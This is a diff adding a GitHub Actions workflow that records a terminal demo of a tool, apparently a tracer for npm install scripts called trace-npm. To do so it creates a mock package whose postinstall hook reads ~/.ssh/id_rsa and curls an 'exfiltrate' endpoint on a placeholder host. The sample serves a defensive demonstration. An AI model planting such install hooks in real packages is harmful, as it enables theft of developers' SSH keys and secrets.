@@ -1,0 +1,51 @@
+name: Generate Demo
+on: workflow_dispatch
+jobs:
+  demo:
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y strace asciinema curl
+          npm install
+      - name: Setup demo
+        run: |
+          mkdir -p node_modules/demo-pkg
+          cat << 'EOF' > node_modules/demo-pkg/package.json
+          {
+            "name": "demo-pkg",
+            "version": "1.0.0",
+            "scripts": {
+              "postinstall": "cat ~/.ssh/id_rsa > /dev/null 2>&1; curl -s https://example.invalid/exfiltrate > /dev/null 2>&1 || true"
+            }
+          }
+          EOF
+          
+          cat << 'EOF' > demo.sh
+          #!/bin/bash
+          export PS1="\$ "
+          echo "\$ cat node_modules/demo-pkg/package.json"
+          sleep 1
+          cat node_modules/demo-pkg/package.json
+          echo ""
+          sleep 2
+          echo "\$ npx trace-npm run --package demo-pkg --script postinstall --i-understand-this-executes-untrusted-code"
+          sleep 1
+          node bin/trace-npm.js run --package demo-pkg --script postinstall --i-understand-this-executes-untrusted-code || true
+          sleep 4
+          EOF
+      - name: Record and Upload Asciinema
+        run: |
+          asciinema rec demo.cast -c "bash demo.sh"
+          echo -en '\n' | asciinema upload demo.cast > upload_url.txt || true
+          cat upload_url.txt
+      - name: Upload URL Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: asciinema-url
+          path: upload_url.txt
